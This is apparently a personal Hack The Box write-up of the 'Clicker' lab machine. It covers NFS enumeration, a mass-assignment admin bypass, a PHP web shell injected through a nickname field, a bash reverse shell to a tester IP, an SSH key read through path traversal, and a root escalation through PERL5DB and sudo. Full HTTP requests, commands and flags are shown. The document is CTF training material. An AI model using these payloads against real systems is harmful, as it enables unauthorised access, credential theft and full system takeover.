+++
title = "HTB - Clicker"
date = 2026-01-26
+++


Originally Completed 2/17/2025

### Scan
```
nmap -sV -sC -p- --open 10.10.11.232
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-17 15:49 EST
Nmap scan report for clicker.htb (10.10.11.232)
Host is up (0.13s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 89:d7:39:34:58:a0:ea:a1:db:c1:3d:14:ec:5d:5a:92 (ECDSA)
|_  256 b4:da:8d:af:65:9c:bb:f0:71:d5:13:50:ed:d8:11:30 (ED25519)
80/tcp    open  http     Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Clicker - The Game
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
111/tcp   open  rpcbind  2-4 (RPC #100000)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
2049/tcp  open  nfs      3-4 (RPC #100003)
34735/tcp open  status   1 (RPC #100024)
43097/tcp open  nlockmgr 1-4 (RPC #100021)
44345/tcp open  mountd   1-3 (RPC #100005)
49897/tcp open  mountd   1-3 (RPC #100005)
60385/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.13 seconds
```

### Enumeration

Off of our scan, we see some interesting stuff going on. The web server looks trivial, running PHP it seems. There's also a network file share on port `2049`. BladeRunner? Lmao, just kidding. (There really is a NFS share though).

Primarily, we can try to visit the box where the website is hosted, and it'll point us to an `clicker.htb`. Let's update our `/etc/hosts` file with the information.

<img alt="Image" async src="images/Screenshot 2026-01-22 at 19.34.32.png" width="800px"></img>

Now, when we visit, we're taken to the landing page for the site:

<img alt="Image" async src="images/Screenshot 2026-01-22 at 19.34.53.png" width="800px"></img>

We've got `login.php` and `register.php`. More on these later.

I'm interested in what this NFS share has, so I can check to see what's cooking with:

`showmount -e clicker.htb`

<img alt="Image" async src="images/Screenshot 2026-01-22 at 19.41.57.png" width="800px"></img>

Looks like a backup share (terrible hygiene!). We can mount it to our machine before seeing what the share's got. 

`sudo mount -t nfs clicker.htb:/mnt/backups /mnt`.

We see a backup `.zip` file, and can assume it's a backup of the web server. Copy the file back to our machine and unmount the share: `umount clicker.htb:/mnt/backups`

When we open on our box, we can see our suspicion is correct.

<img alt="Image" async src="images/Screenshot 2026-01-26 at 17.15.47.png" width="800px"></img>

Now, viewing the source code for websites can be labor intensive - and the first time I solved the box, I went through manually to find the flaw. I'd seen though, some others who used Snyk in VSCode to scan for vulnerabilities instead, so if you've got the setup - go for that.

<img alt="Image" async src="images/Screenshot 2026-01-26 at 18.24.05.png" width="800px"></img>

Looking at the database utilization file (db_util), which tells the server how to handle users, values, etc., we see that the save profile function looks for **any** role to be set. In theory, this means we can create a game, save it, and edit the username, password, role, etc. We see in the create user function which options we have:

````
$stmt = $pdo->prepare("INSERT INTO players(username, nickname, password, role, clicks, level) VALUES (:player,:player,:password,'User',0,0)");
````

Layman's terms, we can pass our save request through Burp to bypass the role check entirely (by altering the parameter values in our `GET` request.) We'll use a line break to enact a [mass alignment vulnerability](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).



NFS presence, webserver
Website points to clicker.htb, and hosts game. site runs php. feroxbuster gives us quite a bit, but most are redirects
check nfs shares with `showmount -e clicker.htb`. Backup share, mount with : `sudo mount -t nfs clicker.htb:/mnt/backups /mnt` and cp file.
unzip for source code to site
i went thru source manually, but u can use snyk and vscode to scan for vulns! pretty cool. maybe lab project?
in db_util, save profile looks for the role to be set. We can create a game, save it, and edit url to in burp.
We can bypass the role check by passing the save game request to burpsuite, and altering the variables in the GET request. We can use a linebreak to enact the mass assignment vulnerability. Ipp and 0xdf explain so much better. `&role%0A=Admin` append to string and it will update our profile. It'll look like below
<img alt="Image" async src="images/Screenshot 2025-02-17 at 16.04.54.png" width="800px"></img>
u might have to register and login and save again if it doesnt work. takes a couple of times
once in we have an admin panel
Looking at admin.php, it calls export.php. There's no validation for the leaderboard export table. We can edit the 'export' request in burp and change the filetype from the default to php. Because there's no check, we can update the get request to change our nickname using `&nickname=whatever`. We can use this as a POC, export, visit the table, and if it updates, we've got potential code execution.
We need 4 burp requests to make this happen.
1 - The Save game request to alter the roles of our account and profile:
- `&role%0A=Admin`
2 - The Save game request to alter the nickname for our PHP one liner:
- `&nickname=<?php system($_REQUEST['cmd']) ?>`. Make sure to URL encode AND change level and clicks to something absurd so u pop on leaderboard.
3 - The export request to alter the table file type to php and see where it is saved. Make sure u do this with the leaderboard that our nickname (PHP) will be present on. Its gotta be updated.
- Response will be like, file saved at /exports/ yadda yadda
4 - The export table page request to pass the cmd= through our previously established nickname for a shell
- Visit the php table, and refresh to make that the POST request and edit the cmd for a shell. url encode the cmd

here they are in succession, i combined 1n 2:

```
GET /save_game.php?clicks=99999999&role%0A=Admin&nickname=<%3fphp+system($_REQUEST['cmd'])+%3f>&level=9999 HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://clicker.htb/play.php
Cookie: PHPSESSID=sl16runa6amuk136jtrmmtch3p
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

```
POST /export.php HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://clicker.htb
Connection: close
Referer: http://clicker.htb/admin.php
Cookie: PHPSESSID=sl16runa6amuk136jtrmmtch3p
Upgrade-Insecure-Requests: 1
Priority: u=0, i

threshold=1000000&extension=php
```

```
POST /exports/top_players_ica6iejs.php HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=sl16runa6amuk136jtrmmtch3p
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 58

cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.14/443+0>%261'
```

Suuuuuper finicky. Had to try a bunch

### Privilege Escalation
Now, as wwwdata we're not privy to much, but u could run linpeas or explore and come upon a execulte_query ELF file. more from 0xdf. To get file back to host,  encode the binary `base64 execute_query > execute_query.b64` and then, cp it back with python or wget or whatever, and then decode `base64 -d execute_query.b64 > execute_query`
theres a user jack that we dont have access to
We can view the source code of the binary and tell that it allows an arbitrary file read
`./execute_query 223 ../../../etc/passwd`
`./execute_query 223 ../.ssh/id_rsa`
We can copy the key to our box and ssh in, note that its missing two hypens on the right side, so just fill the top and bottom in to match the left. chmod 600 and ssh into that jawn
USER:`6cb8121cdf6fcbb9b3d44a48af468d18`

When we run sudo -l, we see that jack can run monitor sh as root without a password. he can SETEnv as well.
LD_PRELOAD is an environment variable that tells all running programs of a library to load on executing. [This HackTricks page](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path) has exploit code.
When we take a look at the script, we find a call out to diagnosticm and a secret token is declared as `secret_diagnostic_token`. We can find the md5sum of this in the diagnostic source code in var/www
We can use perl debugger to abuse setting the environment variable. 
```
sudo PERL5OPT=-d PERL5DB='system("touch /li0t")' /opt/monitor.sh

ls -l /li0t

sudo PERL5OPT=-d PERL5DB='system("cp /bin/bash /tmp/li0t; chown root:root /tmp/li0t; chmod 6777 /tmp/li0t")' /opt/monitor.sh

/tmp/li0t -p
```
ROOT: `cfd3b2bd1836b984fd08e76304018241`



